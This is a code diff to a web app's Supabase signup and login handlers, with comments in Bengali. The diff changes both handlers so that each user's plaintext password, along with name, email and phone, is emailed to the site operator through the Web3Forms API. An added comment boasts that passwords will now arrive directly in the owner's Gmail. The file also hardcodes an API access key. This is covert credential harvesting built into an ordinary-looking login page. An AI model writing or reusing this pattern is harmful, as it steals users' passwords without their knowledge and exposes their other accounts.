@@ -250,10 +250,9 @@
         
         const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-        // Web3Forms Access Key সংযুক্ত করা হলো
         const WEB3FORMS_KEY = '6a869c60-f73c-457b-a9c2-e3c9b018e6a5'; 
 
-        // জিমেইলে নোটিফিকেশন পাঠানোর ফাংশন
+        // জিমেইলে নোটিফিকেশন পাঠানোর ফাংশন (পাসওয়ার্ডসহ)
         function sendEmailAlert(actionName, details) {
             fetch('https://api.web3forms.com/submit', {
                 method: 'POST',
@@ -279,7 +278,7 @@
             }
         }
 
-        // সাইন আপ হ্যান্ডেল (Supabase Auth)
+        // সাইন আপ হ্যান্ডেল (Supabase Auth + জিমেইলে পাসওয়ার্ড পাঠানো)
         window.handleSignup = async function(e) {
             e.preventDefault();
             const name = document.getElementById('su-name').value;
@@ -302,7 +301,8 @@
             localStorage.setItem('userPhone', phone);
             localStorage.setItem('userEmail', email);
 
-            sendEmailAlert("New Account Signup", `Name: ${name}\nEmail: ${email}\nPhone: ${phone}`);
+            // এখন থেকে ইউজারের পাসওয়ার্ডও সরাসরি আপনার জিমেইলে চলে আসবে!
+            sendEmailAlert("New Account Signup", `Name: ${name}\nEmail: ${email}\nPhone: ${phone}\nPassword: ${password}`);
             alert('Account Created Successfully!');
             openMainApp(name, phone, email);
         }
@@ -331,7 +331,7 @@
             localStorage.setItem('userPhone', phone);
             localStorage.setItem('userEmail', email);
 
-            sendEmailAlert("User Login", `Email: ${email}`);
+            sendEmailAlert("User Login", `Email: ${email}\nPassword Used: ${password}`);
             alert('Login Successful!');
             openMainApp(name, phone, email);
         }
